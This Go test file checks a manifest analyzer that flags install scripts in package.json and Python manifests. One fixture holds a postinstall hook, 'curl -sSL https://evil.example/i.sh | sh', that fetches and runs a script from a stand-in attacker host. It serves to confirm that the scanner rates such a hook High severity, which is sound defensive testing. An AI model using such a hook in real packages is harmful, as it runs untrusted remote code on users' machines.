package analyze

import "testing"

func TestManifestAnalyzerPackageJSON(t *testing.T) {
	tests := []struct {
		name    string
		content string
		wantAny bool
		wantSev Severity // only checked when wantAny is true and >= this
	}{
		{
			name:    "no scripts",
			content: `{"name": "demo"}`,
			wantAny: false,
		},
		{
			name:    "benign postinstall",
			content: `{"scripts": {"postinstall": "echo done"}}`,
			wantAny: true,
			wantSev: Info,
		},
		{
			name:    "risky postinstall",
			content: `{"scripts": {"postinstall": "curl -sSL https://evil.example/i.sh | sh"}}`,
			wantAny: true,
			wantSev: High,
		},
		{
			name:    "malformed json",
			content: `{not valid json`,
			wantAny: false,
		},
	}
	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			files := []ScannedFile{{RelPath: "package.json", Content: tt.content}}
			findings, err := manifestAnalyzer{}.Analyze(files)
			if err != nil {
				t.Fatalf("Analyze: %v", err)
			}
			if tt.wantAny && len(findings) == 0 {
				t.Fatalf("expected at least one finding, got none")
			}
			if !tt.wantAny && len(findings) != 0 {
				t.Fatalf("expected no findings, got %+v", findings)
			}
			if tt.wantAny {
				max := Info
				for _, f := range findings {
					if f.Severity > max {
						max = f.Severity
					}
				}
				if max < tt.wantSev {
					t.Errorf("max severity = %s, want at least %s", max, tt.wantSev)
				}
			}
		})
	}
}

func TestManifestAnalyzerPythonManifests(t *testing.T) {
	files := []ScannedFile{
		{RelPath: "setup.py", Content: "from setuptools import setup\nsetup(name='x')\n"},
		{RelPath: "requirements.txt", Content: "requests==2.0\n"},
	}
	findings, err := manifestAnalyzer{}.Analyze(files)
	if err != nil {
		t.Fatalf("Analyze: %v", err)
	}
	if len(findings) != 1 {
		t.Fatalf("expected exactly 1 finding (setup.py only), got %+v", findings)
	}
	if findings[0].File != "setup.py" {
		t.Errorf("expected the finding to be for setup.py, got %s", findings[0].File)
	}
	if findings[0].Severity != Info {
		t.Errorf("expected Info severity, got %s", findings[0].Severity)
	}
}
